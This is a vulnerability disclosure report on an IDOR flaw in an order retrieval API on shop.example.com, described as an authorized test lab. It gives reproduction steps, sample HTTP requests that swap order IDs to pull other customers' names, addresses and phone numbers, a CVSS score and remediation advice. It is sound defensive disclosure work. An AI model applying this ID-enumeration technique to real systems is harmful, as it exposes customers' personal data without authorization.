# Insecure Direct Object Reference (IDOR) on Order Retrieval API — shop.example.com

## Summary
An Insecure Direct Object Reference (IDOR) vulnerability exists in the order retrieval endpoint `/api/orders/{id}` on `shop.example.com`. An authenticated user can enumerate and access other users' orders by modifying the `id` parameter, exposing personally identifiable information (name, address, phone number) without authorization checks.

## OWASP Category / CWE
- **OWASP Top 10 2021:** A01:2021 – Broken Access Control
- **CWE:** CWE-639 – Authorization Bypass Through User-Controlled Key

## Severity
- **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **Base Score:** 6.5 (Medium)
- **Reasoning:** Network-accessible, low complexity, requires only a standard authenticated session (PR:L), no user interaction, unchanged scope, high confidentiality impact (full PII disclosure), no integrity or availability impact.

## Affected Asset
- **Host:** `shop.example.com` (authorized test lab)
- **Endpoint:** `GET /api/orders/{id}`
- **Parameter:** `id` (integer, path parameter)

## Steps to Reproduce
1. Authenticate as **User A** (valid session/token).
2. Request `GET /api/orders/123` → returns User A's own order (expected).
3. Modify the path parameter to `124` and request `GET /api/orders/124`.
4. Observe that the response contains another user's order details: **full name, shipping address, and phone number**.
5. No HTTP 403/401 or authorization error is returned.

## Proof of Concept
**Request (User A's own order):**
```http
GET /api/orders/123 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <user_A_token>
```

**Response (200 OK):**
```json
{
  "id": 123,
  "user_id": 1001,
  "name": "Alice Smith",
  "address": "123 Main St, Springfield",
  "phone": "+1-555-0199",
  "items": [...],
  "total": 49.99
}
```

**Request (Modified ID — other user's order):**
```http
GET /api/orders/124 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <user_A_token>
```

**Response (200 OK — unauthorized data access):**
```json
{
  "id": 124,
  "user_id": 1002,
  "name": "Bob Jones",
  "address": "456 Oak Ave, Shelbyville",
  "phone": "+1-555-0245",
  "items": [...],
  "total": 89.50
}
```

## Impact
- **Confidentiality breach:** Any authenticated user can harvest PII (names, addresses, phone numbers) of all customers by iterating order IDs.
- **Privacy regulation exposure:** Potential violation of GDPR, CCPA, or similar data-protection laws.
- **Business risk:** Customer trust erosion, possible fraud or social engineering using leaked contact details.
- **Scope:** Limited to order records accessible via the vulnerable endpoint; no evidence of write/delete or privilege escalation.

## Remediation
1. **Implement object-level authorization:** Verify that the authenticated user's `user_id` matches the `user_id` owning the requested order before returning data.
2. **Use indirect object references (GUIDs/UUIDs):** Replace sequential integer IDs with unpredictable identifiers to reduce enumeration feasibility.
3. **Enforce consistent access-control middleware:** Centralize authorization checks so every object-retrieval endpoint inherits the same validation logic.
4. **Add rate limiting & monitoring:** Detect and block automated enumeration attempts (e.g., >20 order requests/minute per user).
5. **Regression test:** Add automated tests that attempt cross-user order access and assert HTTP 403/404 responses.

## References
- OWASP Top 10 2021 – A01: Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- CWE-639: https://cwe.mitre.org/data/definitions/639.html
- PortSwigger IDOR Cheat Sheet: https://portswigger.net/web-security/access-control/idor